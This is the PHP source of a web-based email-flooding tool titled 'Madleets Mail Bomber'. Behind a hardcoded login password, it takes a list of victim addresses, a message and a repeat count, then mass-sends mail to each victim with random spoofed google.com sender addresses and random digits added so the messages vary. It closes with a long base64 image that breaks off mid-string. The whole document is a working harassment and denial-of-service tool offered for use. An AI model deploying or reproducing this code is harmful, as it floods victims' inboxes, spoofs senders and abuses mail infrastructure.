<?php
//User Variable : 
$password = "8thbit0xaf3";


session_start();
if(isset($_POST["Login"])){
	if($_POST["password"] == $password){
		$_SESSION["LOGIN"] = "Loggedin";
	}
}
if(isset($_POST["victims"])){
	$numbers = array(1,2,3,4,5,6,7,8,9,0);
	$chars = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z");
	if(isset($_SESSION["LOGIN"]) && $_SESSION["LOGIN"] == "Loggedin"){
		$victims = preg_split("/\\r\\n|\\r|\\n/",$_POST["victims"]);
		$rnm = $_POST["rnm"];
		$msg = $_POST["msg"];
		$count = $_POST["count"];
		$id = $_POST["id"];
		if (is_numeric($count)){			
			foreach($victims as $mails){
				for($i = 0 ; $i < $count ; $i++){
					$mmsg = $msg . ' '  ; 
					if ($rnm == "checked"){ 
						for ($j = 0 ; $j < rand(0,20) ; $j++){
							$numb = $numbers[rand(0,9)] ;	
							$mmsg = $mmsg . $numb;
						}
					}		
					$from = rand (71,1020000000)."@"."google.com";
					$subject= md5("$from");
					mail($mails,$subject,$mmsg,$from);
				}			
			echo($mails . " Has been Flooded For ". $count ." Times <br>" );
			}
		}else{
			echo("Invalid Counter");
			exit(0);	
		}
	}else{
		echo("Dont Inject Me Mother Fucker !");
	}
	exit (0);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Madleets Mail Bomber By 8Th BiT </title>
<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
<style>
body{
	font:Tahoma, Geneva, sans-serif;
	font-size:15px;	
	margin:0px 0px 0px 0px ;
	padding:0px 0px 0px 0px ;
	background-color:#000;
	color:#FFF;
}
#login{
	width:300px;
	margin:10% auto;	
}
nav{
	border:1px dashed;
	padding:5px 5px 5px 5px;
}
nav a{
	margin-right:30px;
	text-decoration:none;
}
nav a:visited{
	color:#FFF;
}
#wrapper{
	margin:0px auto;
	width:851px;	
}
section article{
	border:1px dotted;
	margin-top:20px;
	padding:10px 10px 10px 10px;	
}
section article input[type="text"],input[type="number"],textarea{ 
	width:300px;
	margin-left:50px;
}
section article input[type="submit"]{
	margin-left:50px;	
}
</style>
<script language="javascript" type="text/javascript">
	$(function(){
	$("#clear").click(function(e){
		$("#console").text("");
	});
	$("#submit").click(function(e){
		if($("#victims").val() == ""){
			alert("Please enter Victim(s)");
			$("#victims").focus();
			return false;	
		}
		if($("#message").val() == "" && $("#rnm").attr("checked") != "checked"){
			alert("Please Fill Message");
			$("#message").focus();
			return false;
		}
		if($("#count").val() <= 0 || $("#count").val() == ""  ){
			alert("Please Enter Counter");
			$("#count").focus();
			return false;		
		}
		alert("Sending Request ... \nPlease Wait");
		var randomnumber=Math.floor(Math.random()*99999);
		var poststring =
			   'victims=' + $("#victims").val()
			 + '&rnm=' + $("#rnm").attr("checked")
			 + '&msg=' + $("#message").val()
			 + '&count=' + $("#count").val()
			 + '&id=' + randomnumber ;
		$.ajax({
			url: "<?php echo($_SERVER['PHP_SELF']); ?>",
			method:'POST',			
			data: poststring 
		}).done(function (response) {
			$("#console").append(response);
		}).fail(function () {
			alert("unable to send Data");
		});
		return false;
	});
	});
</script>
</head>

<body>
<?php if(!isset($_SESSION["LOGIN"])):?>
	<div id="login">
    	<form action="" method="post" name="">
			<span>
            	Password : <input name="password" type="password" />
            </span>
            <span>
            	<input name="Login" type="submit"  value="Login" />
            </span>
        </form>
    </div>
<?php elseif(isset($_SESSION["LOGIN"])): ?>
<div id="wrapper">
	<header>
		<img alt="" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/4QBuRXhpZgAASUkqAAgAAAABAGmHBAABAAAAGgAAAAAAAAABAIaSAgA6AAAALAAAAAAAAABDUkVBVE9SOiBnZC1qcGVnIHYxLjAgKHVzaW5nIElKRyBKUEVHIHY2MiksIHF1YWxpdHkgPSA3NQoA/9sAQwAIBgYHBgUIBwcHCQkICgwUDQwLCwwZEhMPFB0aHx4dGhwcICQuJyAiLCMcHCg3KSwwMTQ0NB8nOT04MjwuMzQy/9sAQwEJCQkMCwwYDQ0YMiEcITIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy/8AAEQgBOwNTAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A8CooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiilCk9BQAlFP8p/7po8p/7poAZRTijDqDTaACiiigAopwRj0BpfKf8AumgBlFP8p/7pppBHUUAJRRRQAUUUoVj0FACUU/yn/umjyn/umgBlFP8AKf8AummlSOooASiiigAoopwjc9FNADaKf5T/AN00eU/900AMop/lP/dNHlP/AHTQAyinGNx/CaaRjrQAUUUUAFFKFJ6CneU/900AMopxjcdVNNoAKKKKACiiigAoopwjY9FNADaKf5T/AN00eU/900AMop/lP/dNHlP/AHTQAyin+U/9000gjqKAEoopQpPQUAJRT/Kf+6aPKf8AumgBlFP8p/7po8p/7poAZRT/ACn/ALppCjDqDQA2iigAnpQAUU/y3/umjyn/ALpoAZRT/Kf+6aPKf+6aAGUU/wAp/wC6aPKf+6aAGUU/yn/ummkEdaAEooooAKKUAnoKd5T/AN00AMop/lP/AHTR5T/3TQAyin+U/wDdNNKkdRQAlFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFF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